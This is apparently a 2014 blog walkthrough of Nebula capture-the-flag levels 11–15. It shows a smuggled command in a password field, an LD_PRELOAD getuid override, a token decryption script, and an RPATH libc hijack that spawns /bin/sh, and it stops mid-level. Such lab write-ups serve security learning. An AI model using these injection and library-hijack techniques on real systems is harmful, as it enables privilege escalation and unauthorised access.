<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Cracking Nebula Part 2 - Unlogic</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="keywords" content="">
  <link rel="canonical" href="http://unlogic.co.uk/2014/07/02/cracking-nebula-part2/">

  
  

  
  

  
  

  <link rel="stylesheet" type="text/css" href="http://unlogic.co.uk//css/combined-min.css">

</head>
<body class="">

<div class="site-wrap">
  <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="http://unlogic.co.uk/" class="site-title">Unlogic</a>
      <nav class="site-nav right">
      <a href="http://unlogic.co.uk/tags">Tags</a>

</form>

      </nav>
      <div class="clearfix"></div>
    </div>
  </div>
</header>

  <div class="post p2 p-responsive wrap" role="main">
    <div class="measure">
      <div class="post-header mb2">
        <h1 class="py2">Cracking Nebula Part 2</h1>
        <span class="post-meta">Jul 2, 2014 by </span><br>
        
      </div>

      <article class="post-content">
      

<p>On <a href="http://www.exploit-exercises.com/">Exploit Exercises</a> you can find a
number of CTF (Capture The Flag) VM images where you can practice your
exploiting, hacking and general computer savviness. I&rsquo;ve been working
my way through the Nebula machine and figured I might as well write
up the process both for other&rsquo;s benefit if they get stuck, and also as
a sort of diary for myself, so I can refer back to any info if I need to.</p>

<p>This continues on from <a href="http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/">part 1</a>.</p>

<h2 id="level-11:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 11</h2>

<blockquote>
<p>The /home/flag11/flag11 binary processes standard input and executes a shell command.</p>

<p>There are two ways of completing this level, you may wish to do both :-)</p>
</blockquote>

<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;unistd.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
<span class="cp">#include &lt;sys/types.h&gt;</span>
<span class="cp">#include &lt;fcntl.h&gt;</span>
<span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;sys/mman.h&gt;</span>

<span class="cm">/*</span>
<span class="cm"> * Return a random, non predictable file, and return the file descriptor for it.</span>
<span class="cm"> */</span>

<span class="kt">int</span> <span class="nf">getrand</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">path</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>

  <span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;TEMP&quot;</span><span class="p">);</span>
  <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
  
  <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;%s/%d.%c%c%c%c%c%c&quot;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> 
    <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> 
    <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
    <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span>

  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
  <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

  <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>

  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
    <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define CL &quot;Content-Length: &quot;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>

  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;reading from stdin&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">CL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;invalid header&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">length</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">));</span>
  
  <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread length&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">blue</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pink</span><span class="p">;</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">getrand</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">);</span>

    <span class="k">while</span><span class="p">(</span><span class="n">blue</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;blue = %d, length = %d, &quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>

      <span class="n">pink</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;pink = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>

      <span class="k">if</span><span class="p">(</span><span class="n">pink</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread fail(blue = %d, length = %d)&quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>

      <span class="n">blue</span> <span class="o">-=</span> <span class="n">pink</span><span class="p">;</span>
    <span class="p">}</span>  

    <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;mmap&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">process</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
  <span class="p">}</span>

<span class="p">}</span>
</code></pre></div>


<p>I&rsquo;ll be honest with you and admit that I had a lot of trouble with this. I eventually looked up how to do this on other blogs, but still couldn&rsquo;t get it to work. After some searching I believe it&rsquo;s down to the bash version my VM is running. The exploit was possible due to some feature in older versions of bash, but not in the version I have. If you would like to read how to get level 11 you can do so here: <a href="http://www.kroosec.com/2012/11/nebula-level11.html">http://www.kroosec.com/2012/11/nebula-level11.html</a></p>

<h2 id="level-12:eaf9fabfe6e85567a2c1f06adf83e2d8">level 12</h2>

<blockquote>
<p>There is a backdoor process listening on port 50001.</p>
</blockquote>

<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="n">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s">&quot;socket&quot;</span><span class="p">)</span>
<span class="n">local</span> <span class="n">server</span> <span class="o">=</span> <span class="n">assert</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">50001</span><span class="p">))</span>

<span class="n">function</span> <span class="n">hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> 
  <span class="n">prog</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">&quot;echo &quot;</span><span class="p">..</span><span class="n">password</span><span class="p">..</span><span class="s">&quot; | sha1sum&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nl">prog</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s">&quot;*all&quot;</span><span class="p">)</span>
  <span class="nl">prog</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span>

  <span class="k">return</span> <span class="n">data</span>
<span class="n">end</span>


<span class="k">while</span> <span class="mi">1</span> <span class="k">do</span>
  <span class="n">local</span> <span class="n">client</span> <span class="o">=</span> <span class="nl">server</span><span class="p">:</span><span class="n">accept</span><span class="p">()</span>
  <span class="nl">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Password: &quot;</span><span class="p">)</span>
  <span class="nl">client</span><span class="p">:</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
  <span class="n">local</span> <span class="n">line</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="nl">client</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span>
  <span class="k">if</span> <span class="n">not</span> <span class="n">err</span> <span class="n">then</span>
    <span class="n">print</span><span class="p">(</span><span class="s">&quot;trying &quot;</span> <span class="p">..</span> <span class="n">line</span><span class="p">)</span> <span class="o">--</span> <span class="n">log</span> <span class="n">from</span> <span class="n">where</span> <span class="p">;</span>\
    <span class="n">local</span> <span class="n">h</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">h</span> <span class="o">~=</span> <span class="s">&quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot;</span> <span class="n">then</span>
      <span class="nl">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Better luck next time</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="k">else</span>
      <span class="nl">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Congrats, your token is 413**CARRIER LOST**</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
    <span class="n">end</span>

  <span class="n">end</span>

  <span class="nl">client</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
<span class="n">end</span>
</code></pre></div>


<p>So we need to connect to the localhost on port 50001 and enter the correct password. the password is whatever the hash is in plain text. But even if we get it right you can see that we don&rsquo;t get our token. With a specially crafted password however, we can make use of the <code>io.popen</code> call.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level12@nebula:/home/flag12$</span> nc localhost 50001
<span class="go">Password: hello &amp;&amp; getflag &gt; /tmp/out</span>
<span class="go">Better luck next time</span>
<span class="gp">level12@nebula:/home/flag12$</span> cat /tmp/out
<span class="go">You have successfully executed getflag on a target account</span>
</code></pre></div>
</p>

<h2 id="level-13:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 13</h2>

<blockquote>
<p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
</blockquote>

<p><div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;unistd.h&gt;</span>
<span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;sys/types.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>

<span class="cp">#define FAKEUID 1000</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">token</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

  <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="n">FAKEUID</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Security failure detected. UID %d started us, we expect %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">(),</span> <span class="n">FAKEUID</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The system administrators will be notified of this violation</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// snip, sorry :)</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;your token is %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
  
<span class="p">}</span>
</code></pre></div>
</p>

<p>Here we need to fake our UID. Sounds tricky. Actually, we don&rsquo;t fake our UID, we fake the call to <code>getuid</code>. How?
<code>getuid</code> is called from a library, which means we are able to replace it with our own library. Let&rsquo;s take a look at
the function definition of <code>getuid</code></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">GETUID(2)                  Linux Programmer&#39;s Manual                 GETUID(2)</span>

<span class="go">NAME</span>
<span class="go">       getuid, geteuid - get user identity</span>

<span class="go">SYNOPSIS</span>
<span class="go">       #include &lt;unistd.h&gt;</span>
<span class="go">       #include &lt;sys/types.h&gt;</span>

<span class="go">       uid_t getuid(void);</span>
<span class="go">       uid_t geteuid(void);</span>
</code></pre></div>
</p>

<p>Ok, so let&rsquo;s write our verison of:</p>

<p><div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;sys/types.h&gt;</span>

<span class="kt">uid_t</span> <span class="nf">getuid</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">1000</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div>
</p>

<p>and compile it as a shared library which we then preload (see <code>man ld.so</code> for more info on this). We need to
copy the <code>flag13</code> binary to our local directory because it needs to be run as the same user level as the
library we are trying to preload.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level13@nebula:/tmp$</span> gcc -shared -fPIC fake.c -o fetgetuid.so
<span class="gp">level13@nebula:/tmp$</span> cp ~flag13/flag13 .
<span class="gp">level13@nebula:/tmp$</span> <span class="nb">export </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/fetgetuid.so
<span class="gp">level13@nebula:/tmp$</span> ./flag13
<span class="go">your token is b705702b-76a8-42b0-8844-3adabbe5ac58</span>
<span class="gp">level13@nebula:/tmp$</span> ssh flag13@localhost
<span class="go">flag13@localhost&#39;s password: b705702b-76a8-42b0-8844-3adabbe5ac58</span>
<span class="gp">flag13@nebula:~$</span> getflag
<span class="go">You have successfully executed getflag on a target account</span>
</code></pre></div>
</p>

<h2 id="level-14:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 14</h2>

<blockquote>
<p>This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p>
</blockquote>

<p>The contents of <code>token</code> were encrypted using the <code>flag14</code> binary in <code>~flag14</code>. If you run it you can see how it works. Let&rsquo;s enter something and see if we can work out how it works. I created a file with the contents <code>abcdefghijklmno</code> in <code>/tmp/test</code></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go"> level14@nebula:/home/flag14$ cat /tmp/test | ./flag14 -e</span>
<span class="gp">acegikmoqsuwy{}level14@nebula:/home/flag14$</span>
</code></pre></div>
</p>

<p>So luckily it&rsquo;s fairly straightforward, it offsets each letter by the value of its position in the string. A quick Python script can reverse the process.</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"> <span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
  <span class="n">out</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
  <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
    <span class="n">dec</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span>
    <span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">dec</span><span class="p">)</span>

  <span class="k">print</span> <span class="n">out</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
  <span class="nb">input</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="k">print</span> <span class="nb">input</span>
  <span class="n">decrypt</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>
</code></pre></div>
</p>

<p>And now pipe the token into it</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level14@nebula:/home/flag14$</span> python /tmp/decrypt.py 857:g67?5ABBo:BtDA?tIvLDKL<span class="o">{</span>MQPSRQWW.
<span class="go">857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.</span>
<span class="go">8457c118-887c-4e40-a5a6-33a25353165</span>

<span class="gp">level14@nebula:/home/flag14$</span> ssh flag14@localhost

<span class="go">flag14@localhost&#39;s password: 8457c118-887c-4e40-a5a6-33a25353165</span>

<span class="gp">flag14@nebula:~$</span> getflag
<span class="go">You have successfully executed getflag on a target account</span>
</code></pre></div>
</p>

<h2 id="level-15:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 15</h2>

<blockquote>
<p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.</p>

<p>You may wish to review how to &ldquo;compile a shared library in linux&rdquo; and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.</p>

<p>Clean up after yourself :)</p>
</blockquote>

<p>After running <code>strace</code> we notice this particular bit</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level15@nebula:/home/flag15$</span> strace ./flag15
<span class="go">.</span>
<span class="go">.</span>
<span class="go">open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
<span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfdb8ba4) = -1 ENOENT (No such file or directory)</span>
<span class="go">open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
<span class="go">.</span>
<span class="go">.</span>
</code></pre></div>
</p>

<p>It&rsquo;s trying to load libc.so.6 from a specific location. Why is that? Let&rsquo;s use <code>readelf</code> to take a look</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">evel15@nebula:/home/flag15$</span> readelf -d ./flag15

<span class="go">Dynamic section at offset 0xf20 contains 21 entries:</span>
<span class="go">  Tag        Type                         Name/Value</span>
<span class="go"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span>
<span class="go"> 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]</span>
<span class="go"> 0x0000000c (INIT)                       0x80482c0</span>
<span class="go"> .</span>
<span class="go"> .</span>
<span class="go"> .</span>
</code></pre></div>
</p>

<p>So it&rsquo;s got an <code>RPATH</code> to that location and as luck would have it we have write permissions to it. I guess we can create our own <code>libc.so.6</code> in that directory and use it to execute some code - like get ourselves a flag15 shell. Let&rsquo;s take a look at what symbols we&rsquo;re actually using</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level15@nebula:/home/flag15$</span> objdump -R flag15

<span class="go">flag15:     file format elf32-i386</span>

<span class="go">DYNAMIC RELOCATION RECORDS</span>
<span class="go">OFFSET   TYPE              VALUE</span>
<span class="go">08049ff0 R_386_GLOB_DAT    __gmon_start__</span>
<span class="go">0804a000 R_386_JUMP_SLOT   puts</span>
<span class="go">0804a004 R_386_JUMP_SLOT   __gmon_start__</span>
<span class="go">0804a008 R_386_JUMP_SLOT   __libc_start_main</span>
</code></pre></div>
</p>

<p>So we&rsquo;ve got a choice here between <code>__libc_start_main</code> or <code>__gmon_start</code>. As I am more comfortable with <code>__libc_start_main</code> I&rsquo;m going to go with this.</p>

<p>So let us begin with the code for our library by looking up the <a href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">function declaration</a></p>

<p><div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;linux/unistd.h&gt;</span>

<span class="kt">int</span> <span class="nf">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">),</span> 
<span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> 
<span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="o">*</span><span class="n">stack_end</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</p>

<p>In theory we should get a shell now</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level15@nebula:/var/tmp/flag15$</span> gcc -shared -fPIC -o libc.so.6 mylibc.c
<span class="gp">level15@nebula:/var/tmp/flag15$</span> ~flag15/flag15
<span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</span>
<span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)</span>
<span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)</span>
<span class="go">/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference</span>
</code></pre></div>
</p>

<p>Nuts, we have a symbol missing, namely <code>__cxa_finalize</code>. Let&rsquo;s add it an try again
<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;linux/unistd.h&gt;</span>

<span class="kt">void</span> <span class="nf">__cxa_finalize</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">d</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">),</span> 
<span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> 
<span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="o">*</span><span class="n">stack_end</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level15@nebula:/var/tmp/flag15$</span> gcc -shared -fPIC -o libc.so.6 mylibc.c
<span class="gp">level15@nebula:/var/tmp/flag15$</span> ~flag15/flag15
